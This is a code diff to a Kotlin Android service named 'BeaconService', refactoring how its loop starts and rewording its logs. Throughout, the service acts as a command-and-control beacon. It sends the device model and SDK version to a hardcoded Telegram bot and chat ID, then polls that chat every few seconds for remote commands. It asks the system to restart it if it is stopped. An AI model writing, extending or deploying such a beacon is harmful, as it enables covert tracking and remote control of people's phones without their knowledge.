@@ -22,35 +22,44 @@ class BeaconService : Service() {
     private val CHAT_ID = "6146550840"
     private val API = "https://api.telegram.org/bot$BOT_TOKEN"
     private var offset = 0L
+    private var running = false
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        scope.launch {
-            send("beacon\nmodel: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
-            while (true) {
-                try {
-                    val r = client.newCall(
-                        Request.Builder().url("$API/getUpdates?offset=$offset&timeout=10").build()
-                    ).execute()
-                    val body = r.body?.string() ?: continue
-                    val arr = JSONObject(body).optJSONArray("result") ?: continue
-                    for (i in 0 until arr.length()) {
-                        val u = arr.getJSONObject(i)
-                        offset = u.getLong("update_id") + 1
-                        val msg = u.optJSONObject("message") ?: continue
-                        val chat = msg.optJSONObject("chat")?.optString("id") ?: continue
-                        if (chat != CHAT_ID) continue
-                        val text = msg.optString("text", "")
-                        if (text == "/info") send("model: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
-                        else if (text == "/ping") send("pong")
-                        else if (text.isNotEmpty()) send("got: $text")
-                    }
-                } catch (e: Exception) {
-                    Log.e("beacon", "poll", e)
-                }
-                delay(3000)
-            }
+        if (!running) {
+            running = true
+            scope.launch { loop() }
         }
         return START_STICKY
+    }
+
+    private suspend fun loop() {
+        try {
+            send("beacon\nmodel: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
+        } catch (e: Exception) {
+            Log.e("beacon", "start beacon failed", e)
+        }
+        while (true) {
+            try {
+                val url = "$API/getUpdates?offset=$offset&timeout=10"
+                val req = Request.Builder().url(url).build()
+                val body = client.newCall(req).execute().body?.string() ?: ""
+                val arr = JSONObject(body).optJSONArray("result") ?: continue
+                for (i in 0 until arr.length()) {
+                    val u = arr.getJSONObject(i)
+                    offset = u.getLong("update_id") + 1
+                    val msg = u.optJSONObject("message") ?: continue
+                    val chat = msg.optJSONObject("chat")?.optString("id") ?: continue
+                    if (chat != CHAT_ID) continue
+                    val text = msg.optString("text", "")
+                    if (text == "/ping") send("pong")
+                    else if (text == "/info") send("model: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
+                    else if (text.isNotEmpty()) send("got: $text")
+                }
+            } catch (e: Exception) {
+                Log.e("beacon", "poll err", e)
+            }
+            delay(3000)
+        }
     }
 
     private fun send(text: String) {
@@ -60,7 +69,7 @@ class BeaconService : Service() {
             val req = Request.Builder().url("$API/sendMessage").post(body).build()
             client.newCall(req).execute().close()
         } catch (e: Exception) {
-            Log.e("beacon", "send", e)
+            Log.e("beacon", "send err", e)
         }
     }
 
